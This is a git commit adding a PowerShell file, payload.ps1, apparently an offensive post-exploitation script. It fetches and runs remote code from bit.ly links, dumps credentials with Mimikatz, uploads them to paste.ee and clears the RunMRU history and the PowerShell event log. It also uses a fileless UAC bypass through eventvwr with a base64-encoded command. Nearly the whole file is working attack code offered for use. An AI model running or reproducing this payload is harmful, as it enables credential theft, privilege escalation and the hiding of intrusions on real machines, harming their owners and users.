354f86dea603d4da4a578021ff1bfd0ff522d7fa
Alan <alpeine@iastate.edu>
2017-11-23 14:25:12 -0600

    initial commit

---
+++ payload.ps1
@@ -0,0 +1,29 @@
+function Invoke-Payload {
+param (
+	################################################
+	##          API Key from paste.ee             ##
+	  $api_key = ''
+	################################################
+	)
+	
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
+	Clean-RunMRU -Last
+	
+	$Command = "
+	# Import Paste.ee API module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bNdwqV')
+	# Import Mimikatz module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
+	`$Creds = Invoke-Mimikatz -DumpCreds
+	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
+	New-Paste -api_key $api_key -description `$Description -paste `$Creds
+	# Clear EventLog
+	Clear-EventLog -LogName 'Windows PowerShell'
+	"
+
+	## Fileless bypass uac
+	# Import EventVwrBypass module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
+	# Execute bypass w/encoded command
+	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
+}
